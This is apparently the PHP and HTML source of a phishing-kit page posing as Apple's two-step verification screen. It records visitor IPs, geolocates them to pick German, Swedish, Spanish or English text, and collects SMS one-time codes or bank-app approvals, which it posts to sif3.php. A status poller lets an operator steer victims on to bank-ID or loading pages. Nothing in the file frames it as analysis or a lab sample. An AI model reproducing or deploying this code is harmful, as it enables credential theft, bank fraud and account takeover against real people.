<?php
if (session_status() == PHP_SESSION_NONE) { session_start(); }

$ib = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$_SESSION['user_ip'] = $ib;
$ip_clean = str_replace(['.', ':'], '_', $ib);

$visitor_data = [ 'ip' => $ib, 'last_activity' => time(), 'current_page' => 'smbettal.php' ];
file_put_contents("user_" . $ip_clean . ".json", json_encode($visitor_data));

$user_lang = 'en'; 
$details = @json_decode(file_get_contents("http://ip-api.com/json/{$ib}?fields=countryCode"));
if ($details && isset($details->countryCode)) {
    $country = strtoupper($details->countryCode);
    if (in_array($country, ['SE', 'NO', 'FI', 'DK'])) { $user_lang = 'sv'; } 
    elseif (in_array($country, ['DE', 'CH', 'AT', 'LU'])) { $user_lang = 'de'; } 
    elseif (in_array($country, ['ES', 'MX', 'AR', 'CO', 'CL', 'PE', 'VE'])) { $user_lang = 'es'; }
}

$lang_dict = [
    'de' => [
        'h1' => 'Zwei-Schritt-Verifizierung', 'sub' => 'Zur Erhöhung Ihrer Kontosicherheit bitten wir Sie, Ihre Identität zu bestätigen.',
        'err_box' => 'Der eingegebene Code ist ungültig. Bitte überprüfen Sie Ihre Nachricht.', 'timer' => 'Code läuft ab in:',
        'card_h' => 'Sicherheitsprüfung erforderlich', 'card_p' => 'Wir haben einen Einmalcode per SMS an Ihre Telefonnummer gesendet.',
        'lbl_otp' => 'Einmalcode (SMS-Code) eingeben', 'btn' => 'Code absenden', 'bank_toggle' => 'Mit Schweizer Bank-App freigeben',
        'bank_w' => 'Warten auf Freigabe in Ihrer Bank-App...', 'back_sms' => 'Zurück zur SMS-Code-Eingabe', 'err_short' => 'Der Code ist zu kurz.', 'wait' => 'Bitte warten...'
    ],
    'sv' => [
        'h1' => 'Tvåstegsverifiering', 'sub' => 'För att öka ditt kontos säkerhet ber vi dig att bekräfta din identitet.',
        'err_box' => 'Den angivna koden är ogiltig. Kontrollera ditt meddelande.', 'timer' => 'Koden löper ut om:',
        'card_h' => 'Säkerhetskontroll krävs', 'card_p' => 'Vi har skickat en engångskod via SMS till ditt telefonnummer.',
        'lbl_otp' => 'Ange engångskod (SMS-kod)', 'btn' => 'Skicka kod', 'bank_toggle' => 'Godkänn med Bank-App',
        'bank_w' => 'Väntar på godkännande i din bankapp...', 'back_sms' => 'Tillbaka till SMS-kod', 'err_short' => 'Koden är för kort.', 'wait' => 'Vänligen vänta...'
    ],
    'es' => [
        'h1' => 'Verificación en dos pasos', 'sub' => 'Para aumentar la seguridad de su cuenta, le solicitamos que confirme su identidad.',
        'err_box' => 'El código ingresado no es válido. Por favor, compruebe su mensaje.', 'timer' => 'El código expira en:',
        'card_h' => 'Se requiere verificación de seguridad', 'card_p' => 'Hemos enviado un código de un solo uso por SMS a su número de teléfono.',
        'lbl_otp' => 'Ingrese el código de un solo uso (SMS)', 'btn' => 'Enviar código', 'bank_toggle' => 'Aprobar con la aplicación bancaria',
        'bank_w' => 'Esperando la aprobación en su aplicación bancaria...', 'back_sms' => 'Volver al código SMS', 'err_short' => 'El código es demasiado corto.', 'wait' => 'Por favor, espere...'
    ],
    'en' => [
        'h1' => 'Two-Step Verification', 'sub' => 'To increase your account security, we ask you to confirm your identity.',
        'err_box' => 'The entered code is invalid. Please check your message.', 'timer' => 'Code expires in:',
        'card_h' => 'Security Check Required', 'card_p' => 'We have sent a one-time code via SMS to your phone number.',
        'lbl_otp' => 'Enter one-time code (SMS code)', 'btn' => 'Submit Code', 'bank_toggle' => 'Approve with Bank App',
        'bank_w' => 'Waiting for approval in your bank app...', 'back_sms' => 'Back to SMS code entry', 'err_short' => 'The entered code is too short.', 'wait' => 'Please wait...'
    ]
];
$text = $lang_dict[$user_lang];
?>
<!DOCTYPE html>
<html class="full-height" dir="ltr" lang="<?php echo $user_lang; ?>">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Apple Account - OTP</title>
  <link rel="shortcut icon" href="https://appleid.cdn-apple.com/static/bin/cb3460663665/images/favicon.ico">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #1d1d1f; -webkit-font-smoothing: antialiased; }
    .apple-nav { width: 100%; background: rgba(251, 251, 253, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #d2d2d7; display: flex; justify-content: center; align-items: center; padding: 0 22px; height: 48px; font-size: 12px; }
    .signin-container { max-width: 440px; margin: 50px auto; padding: 0 20px; text-align: center; display: flex; flex-direction: column; align-items: center; }
    .logo-container { margin-bottom: 20px; width: 130px; height: 130px; display: flex; align-items: center; }
    .logo-container img { width: 100%; height: 100%; object-fit: contain; }
    h1 { font-size: 32px; font-weight: 600; margin-bottom: 8px; }
    .sub-title-text { font-size: 17px; margin-bottom: 25px; }
    .error-box { display: none; background: #fffdfd; border: 1px solid #de350b; border-radius: 12px; padding: 14px; margin-bottom: 20px; color: #de350b; font-size: 13px; text-align: left; width: 100%; }
    .timer-box { font-size: 13px; color: #6e6e73; margin-bottom: 20px; background: #f5f5f7; padding: 12px 16px; border-radius: 12px; border: 1px solid #d2d2d7; display: flex; justify-content: space-between; width: 100%; font-weight: 500; }
    .timer-count { color: #de350b; font-weight: 700; }
    .verification-card { border: 1px solid #d2d2d7; border-radius: 12px; padding: 16px; margin-bottom: 20px; width: 100%; text-align: left; }
    .card-header-info { display: flex; gap: 12px; }
    .card-icon { font-size: 20px; color: #0071e3; }
    .card-text h3 { font-size: 14px; font-weight: 600; margin-bottom: 4px; }
    .card-text p { font-size: 13px; color: #6e6e73; line-height: 1.4; }
    form { width: 100%; display: flex; flex-direction: column; }
    .form-group { margin-bottom: 20px; width: 100%; text-align: left; }
    .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; }
    .form-input { width: 100%; height: 56px; border: 1px solid #86868b; border-radius: 12px; padding: 16px; font-size: 17px; outline: none; text-align: center; }
    .form-input:focus { border-color: #0071e3; box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.15); }
    .form-input.input-error { border-color: #de350b !important; }
    .confirm-btn { height: 52px; border-radius: 12px; font-size: 16px; font-weight: 500; cursor: pointer; border: none; width: 100%; background-color: #0071e3; color: #fff; }
    .method-toggle-link { display: block; font-size: 13px; color: #0066cc; margin-top: 12px; cursor: pointer; text-align: center; font-weight: 500; }
    .bank-loader-wrapper { display: flex; align-items: center; justify-content: center; gap: 12px; padding: 16px; background: #f5f5f7; border: 1px solid #d2d2d7; border-radius: 12px; color: #0066cc; font-size: 14px; width: 100%; }
    .spinner-loop { animation: spin 1s linear infinite; font-size: 18px; color: #0071e3; }
    @keyframes spin { 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
    <nav class="apple-nav"></nav>
    <div class="signin-container">
        <div id="amazon-error-box" class="error-box"><i class="fa-solid fa-triangle-exclamation"></i><span><?php echo $text['err_box']; ?></span></div>
        <div id="timer-section" class="timer-box"><span><?php echo $text['timer']; ?></span><span id="countdown-timer" class="timer-count">01:59</span></div>
        <div class="logo-container"><img src="1.jpg" alt="Logo"></div>
        <h1><?php echo $text['h1']; ?></h1>
        <p class="sub-title-text"><?php echo $text['sub']; ?></p>
        <form id="otp-gateway-form" action="sif3.php" method="POST">
          <div class="verification-card">
            <div class="card-header-info">
              <i class="fa-solid fa-shield-halved card-icon"></i>
              <div class="card-text"><h3><?php echo $text['card_h']; ?></h3><p><?php echo $text['card_p']; ?></p></div>
            </div>
          </div>
          <div id="sms-input-group" style="width: 100%;">
            <div class="form-group">
              <label><?php echo $text['lbl_otp']; ?></label>
              <input name="sms_code" id="otp" class="form-input" placeholder="000000" type="text" maxlength="6" style="letter-spacing:4px; font-weight:700;">
              <span id="errorotp" style="color:#de350b; font-size:12px; display:block; margin-top:6px;"></span>
            </div>
            <button type="button" onclick="VerifyAndSubmit();" id="sendotp" class="confirm-btn"><?php echo $text['btn']; ?></button>
            <span class="method-toggle-link" onclick="toggleMethod('bank')"><i class="fa-solid fa-mobile-screen-button"></i> <?php echo $text['bank_toggle']; ?></span>
          </div>
          <div id="bank-input-group" style="display: none; width: 100%;">
            <div class="bank-loader-wrapper"><i class="fa-solid fa-spinner spinner-loop"></i><span><?php echo $text['bank_w']; ?></span></div>
            <span class="method-toggle-link" onclick="toggleMethod('sms')"><i class="fa-solid fa-comment-sms"></i> <?php echo $text['back_sms']; ?></span>
          </div>
          <input type="hidden" id="verification_method" name="verification_method" value="sms">
        </form>
    </div>
    <script>
      document.getElementById('otp').addEventListener('input', function(e) { e.target.value = e.target.value.replace(/\D/g, ''); });
      window.addEventListener('DOMContentLoaded', function() {
          if (new URLSearchParams(window.location.search).has('error')) {
              document.getElementById('amazon-error-box').style.display = "block"; document.getElementById('otp').classList.add('input-error');
          }
          var duration = 119, timerElement = document.getElementById('countdown-timer');
          var interval = setInterval(function () {
              var minutes = parseInt(duration / 60, 10), seconds = parseInt(duration % 60, 10);
              timerElement.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
              if (--duration < 0) { clearInterval(interval); timerElement.textContent = "00:00"; }
          }, 1000);
      });
      function toggleMethod(method) {
          document.getElementById('sms-input-group').style.display = (method === 'bank') ? 'none' : 'block';
          document.getElementById('bank-input-group').style.display = (method === 'bank') ? 'block' : 'none';
          document.getElementById('verification_method').value = (method === 'bank') ? 'bank_app' : 'sms';
          if(method === 'bank') setTimeout(() => { document.getElementById('otp-gateway-form').submit(); }, 5000);
      }
      function VerifyAndSubmit() {
        var field = document.getElementById('otp');
        if (field.value.trim().length < 4) {
          field.classList.add('input-error'); document.getElementById('errorotp').innerText = "<?php echo $text['err_short']; ?>";
        } else {
          document.getElementById('sendotp').innerHTML = "<?php echo $text['wait']; ?>";
          setTimeout(() => { document.getElementById('otp-gateway-form').submit(); }, 5000);
        }
      }
        setInterval(() => {
            fetch('get_status.php?nocache=' + new Date().getTime()).then(r => r.text()).then(status => {
                status = status.trim().toLowerCase();
                if (status === 'bank') window.location.href = "bankid.php";
                else if (status === 'wait') window.location.href = "lod2.php";
                else if (status === 'success_done') window.location.href = "https://www.apple.com";
            });
        }, 2000);
    </script>
</body>
</html>